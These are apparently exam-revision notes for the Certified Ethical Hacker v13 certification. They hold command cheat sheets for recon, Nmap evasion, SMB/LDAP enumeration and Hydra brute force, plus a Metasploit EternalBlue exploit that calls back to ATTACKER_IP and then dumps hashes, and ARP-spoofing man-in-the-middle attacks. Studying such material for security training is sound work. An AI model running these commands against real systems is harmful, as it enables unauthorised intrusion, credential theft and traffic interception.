# 📚 Study Notes: CEH v13 — All 20 Modules

**Certification:** Certified Ethical Hacker v13  
**Certificate ID:** ECC0385921476  
**Format:** Condensed module summaries for quick revision

---

## Module 01 — Introduction to Ethical Hacking

### Core Concepts
- **Ethical Hacker** = Security professional hired to find vulnerabilities before malicious actors
- **Penetration Testing** = Authorized attempt to exploit systems to evaluate security
- **Bug Bounty** = Programs paying researchers for responsibly disclosed vulnerabilities

### Hacking Phases (5-Phase CEH Model)
```
1. Reconnaissance  → Gather information (passive + active)
2. Scanning        → Identify live hosts, ports, services
3. Gaining Access  → Exploit vulnerabilities
4. Maintaining Access → Backdoors, persistence
5. Clearing Tracks → Log deletion, anti-forensics
```

### Hacker Types
| Type | Color | Description |
|------|-------|-------------|
| Ethical Hacker | White Hat | Authorized, defensive intent |
| Malicious Hacker | Black Hat | Unauthorized, criminal intent |
| Mixed | Grey Hat | Unauthorized but no criminal intent |
| Script Kiddie | N/A | Uses tools without understanding |
| State Actor | Black Hat | Nation-state sponsored |

---

## Module 02 — Footprinting and Reconnaissance

### Passive Reconnaissance (No direct contact with target)
```bash
# WHOIS
whois example.com

# DNS enumeration
nslookup example.com
dig example.com ANY
host -a example.com

# Google Dorks (key ones)
site:example.com
inurl:admin
intitle:"index of"
filetype:pdf site:example.com
"@example.com" filetype:xls

# Shodan queries
hostname:example.com
org:"Example Corp"
port:22 country:US

# Email harvesting
theHarvester -d example.com -b google,linkedin,bing
```

### Active Reconnaissance
```bash
# Traceroute
traceroute example.com  # Linux
tracert example.com     # Windows

# DNS zone transfer (if misconfigured)
dig @ns1.example.com example.com AXFR

# Maltego (GUI)
# Build entity relationship graphs visually
```

---

## Module 03 — Scanning Networks

### Nmap Cheat Sheet (Essential CEH Tool)

```bash
# Host discovery
nmap -sn 192.168.1.0/24          # Ping sweep
nmap -PS22,80,443 192.168.1.1    # TCP SYN discovery

# Port scanning
nmap -sS 192.168.1.1             # SYN scan (stealth)
nmap -sT 192.168.1.1             # TCP connect (loud)
nmap -sU -p 53,161 192.168.1.1  # UDP scan

# Service/Version detection
nmap -sV -sC 192.168.1.1        # Service versions + default scripts
nmap -A 192.168.1.1              # Aggressive (OS + version + scripts)

# Specific ports
nmap -p 80,443,8080 192.168.1.1
nmap -p 1-65535 192.168.1.1     # All ports

# Output formats
nmap -oN output.txt              # Normal
nmap -oX output.xml              # XML (for import)
nmap -oG output.gnmap            # Grep-friendly

# Evasion
nmap -D RND:10 192.168.1.1       # Decoy scan
nmap -f 192.168.1.1              # Fragment packets
nmap -T0 192.168.1.1             # Slowest timing (paranoid)
nmap --source-port 53 192.168.1.1  # Spoof source port
```

---

## Module 04 — Enumeration

### SMB Enumeration
```bash
# List shares
smbclient -L \\TARGET_IP -N
enum4linux -a TARGET_IP

# Null session (legacy Windows)
smbclient \\\\TARGET_IP\\IPC$ -N
rpcclient -U "" TARGET_IP -N
```

### SNMP Enumeration
```bash
# SNMPv1/v2c with community string "public"
snmpwalk -v2c -c public TARGET_IP
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.4.1.77.1.2.25  # Windows users
```

### DNS Enumeration
```bash
# Zone transfer
dig @TARGET_IP domain.com AXFR

# Brute force subdomains
dnsrecon -d domain.com -t brt -D /usr/share/wordlists/dnsmap.txt
gobuster dns -d domain.com -w wordlist.txt
```

### LDAP Enumeration
```bash
ldapsearch -x -h TARGET_IP -b "dc=domain,dc=com"
ldapsearch -x -h TARGET_IP -b "dc=domain,dc=com" "(objectClass=user)"
```

---

## Module 05 — Vulnerability Analysis

### Vulnerability Scanning Tools

| Tool | Type | Best For |
|------|------|---------|
| Nessus | Commercial | Enterprise scanning |
| OpenVAS | Open Source | Free alternative to Nessus |
| Qualys | Cloud-based | Continuous monitoring |
| Nikto | Web-focused | HTTP server misconfigs |
| Nuclei | Template-based | Fast, community-driven |

```bash
# Nikto web scan
nikto -h http://TARGET_IP -o report.txt

# Nuclei with templates
nuclei -u http://TARGET_IP -t nuclei-templates/
```

---

## Module 06 — System Hacking

### Password Attacks
```
Types:
- Dictionary Attack: Try wordlist (rockyou.txt)
- Brute Force: Try all combinations
- Rule-Based: Apply mutations to wordlist
- Rainbow Table: Precomputed hash lookups

Tools: Hashcat, John the Ripper, Hydra, Medusa
```

```bash
# Hashcat examples
hashcat -m 0 hash.txt rockyou.txt         # MD5
hashcat -m 1000 hash.txt rockyou.txt      # NTLM
hashcat -m 1800 hash.txt rockyou.txt      # SHA-512 crypt

# John the Ripper
john --wordlist=rockyou.txt hash.txt
john --show hash.txt

# Hydra - online brute force
hydra -l admin -P rockyou.txt ssh://TARGET_IP
hydra -l admin -P rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

### Post-Exploitation (Metasploit)
```bash
msfconsole

# Search for exploit
search type:exploit name:eternalblue
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
run

# Post-exploitation
# After getting a session:
hashdump        # Extract password hashes
sysinfo         # System information
getuid          # Current user
getsystem       # Attempt privilege escalation
run post/multi/recon/local_exploit_suggester
```

---

## Module 07 — Malware Threats

### Malware Types
| Type | Behavior |
|------|---------|
| Virus | Self-replicates by attaching to files |
| Worm | Self-replicates across networks |
| Trojan | Appears legitimate, malicious functionality |
| Ransomware | Encrypts files, demands payment |
| Spyware | Silently exfiltrates data |
| Rootkit | Hides malware presence from OS |
| Keylogger | Records keystrokes |

### Analysis Approaches
```
Static Analysis:
- strings, file, exiftool
- Disassembly: IDA Pro, Ghidra
- AV scan, VirusTotal

Dynamic Analysis:
- Run in isolated sandbox (Cuckoo, Any.run)
- Monitor: Process Monitor, Wireshark
- Check: Registry, File system, Network connections
```

---

## Module 08 — Sniffing

### ARP Poisoning
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP poison both directions (MITM)
arpspoof -i eth0 -t TARGET_IP GATEWAY_IP
arpspoof -i eth0 -t GATEWAY_IP TARGET_IP

# Capture with Wireshark (filter)
tcp.port == 80 || tcp.port == 443
http.request.method == "POST"

# Ettercap for automated MITM
ettercap -T -q -i eth0 -M arp:remote /TARGET_IP// /GATEWAY_IP//
```

---

## Modules 09-20 — Quick Reference

| Module | Topic | Key Tools |
|--------|-------|-----------|
| 09 | Social Engineering | SET, GoPhish |
| 10 | DoS/DDoS | LOIC, HOIC, hping3 |
| 11 | Session Hijacking | Burp Suite, Wireshark |
| 12 | IDS/Firewall Evasion | Nmap evasion flags |
| 13 | Web Server Hacking | Nikto, Metasploit |
| 14 | Web App Hacking | Burp Suite, OWASP ZAP |
| 15 | SQL Injection | sqlmap, manual payloads |
| 16 | Wireless Hacking | aircrack-ng, hashcat |
| 17 | Mobile Hacking | ADB, apktool, MobSF |
| 18 | IoT/OT Hacking | Shodan, firmware-mod-kit |
| 19 | Cloud Security | ScoutSuite, Pacu |
| 20 | Cryptography | openssl, hashcat |

---

## 🧠 Most Tested CEH v13 Topics

1. **Port numbers** — Know all common ports (22, 25, 53, 80, 110, 143, 443, 445, 3306, 3389)
2. **Nmap flags** — `-sS`, `-sT`, `-sU`, `-sV`, `-sC`, `-A`, `-O`
3. **Hacking phases** — All 5 phases in order
4. **Attack types** — Know the definition differences (virus vs worm vs trojan)
5. **Cryptography** — Symmetric vs Asymmetric, know algorithms and key lengths
6. **OWASP Top 10** — Know A01-A10 for 2021
7. **Social Engineering** — Types: phishing, vishing, smishing, whaling, baiting

---

*These notes are condensed summaries for revision purposes. Refer to the official EC-Council courseware for complete details.*
